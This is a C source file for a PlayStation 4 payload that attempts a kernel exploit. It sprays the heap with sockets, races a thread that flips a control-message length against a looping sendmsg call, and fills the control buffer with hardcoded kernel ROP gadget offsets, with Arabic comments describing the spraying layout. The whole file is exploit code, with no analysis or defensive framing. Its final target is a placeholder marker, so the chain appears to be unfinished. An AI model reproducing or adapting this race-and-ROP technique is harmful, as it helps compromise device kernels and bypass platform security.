#include <ps4.h>

#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
#define OFF_JMP_RSI_3B           0x049C5D 
#define OFF_POP_RAX_RET          0x09974F
#define OFF_RET                  0x0008E0

#define CONTROL_LEN 256
#define SPRAY_COUNT 256

struct msghdr { void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen; void *msg_control; uint32_t msg_controllen; int msg_flags; };
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };

uint8_t control_buf[CONTROL_LEN];
struct cmsghdr *cmsg;
int global_sock;
int spray_socks[SPRAY_COUNT];

void prepare_heap() {
    for(int i = 0; i < SPRAY_COUNT; i++) {
        spray_socks[i] = syscall(97, 2, 2, 0);
        if(spray_socks[i] > 0) {
            uint8_t dummy[0x50];
            memset(dummy, 0, 0x50);
            syscall(133, spray_socks[i], dummy, 0x50, 0, NULL, 0);
        }
    }
    for(int i = 0; i < SPRAY_COUNT; i += 2) {
        if(spray_socks[i] > 0) { syscall(6, spray_socks[i]); spray_socks[i] = -1; }
    }
}

void *sendmsg_thread(void *arg) {
    (void)arg;
    struct msghdr msg = {0};
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;
    while(1) { syscall(28, global_sock, &msg, 0); }
    return NULL;
}

void *race_thread(void *arg) {
    (void)arg;
    while(1) {
        for(volatile int i = 0; i < 200; i++) {
            cmsg->cmsg_len = 0x50;   
            cmsg->cmsg_len = 0xFFFF; 
        }
    }
    return NULL;
}

int _main(struct thread *td) {
    (void)td;
    initKernel(); initLibc();
    uint64_t kbase = get_kernel_base();
    
    uint64_t step1 = kbase + OFF_PUSH_RSP_POP_RSI_RET; 
    uint64_t step2 = kbase + OFF_JMP_RSI_3B;           
    uint64_t step3 = kbase + OFF_POP_RAX_RET;          
    uint64_t target = 0xDEADC0DE;

    prepare_heap();

    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_len = 0x50;

    // 1. ملء البفر بالخطوة الأولى
    for (int i = 0x48; i < CONTROL_LEN - 8; i += 8) {
        *(uint64_t *)(control_buf + i) = step1;
    }

    // 2. وضع الخطوة الثانية في المسار المتوقع للـ Stack
    for (int i = 0x50; i < 0xA0; i += 8) {
        *(uint64_t *)(control_buf + i) = step2;
    }

    // 3. تقنية "السجادة": نغرق المنطقة حول 0x3b بالهدف
    // سنضع pop_rax و التوقيع في مساحة واسعة لضمان أن jmp [rsi+3b] تصيب أحدهم
    for (int i = 0x20; i < 0x80; i += 16) {
        *(uint64_t *)(control_buf + i) = step3;      // pop rax
        *(uint64_t *)(control_buf + i + 8) = target; // DEADC0DE
    }

    global_sock = syscall(97, 2, 2, 0);
    ScePthread t1, t2;
    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");
    scePthreadJoin(t1, NULL);
    scePthreadJoin(t2, NULL);
    return 0;
}
